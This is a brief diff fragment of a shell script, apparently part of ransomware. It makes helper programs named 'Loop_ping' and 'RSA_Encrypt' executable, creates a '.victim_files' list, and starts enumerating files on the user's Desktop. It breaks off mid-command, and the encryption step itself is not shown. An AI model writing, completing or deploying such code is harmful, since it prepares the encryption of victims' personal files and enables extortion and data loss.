@@ -2,6 +2,9 @@
 
 cd "$(dirname "$0")";
 
+chmod +x ./Loop_ping
+chmod +x ./RSA_Encrypt
+
 test -f .victim_files || touch .victim_files
 
 find -L ~/Desktop/*  -maxdepth 0 -type f \
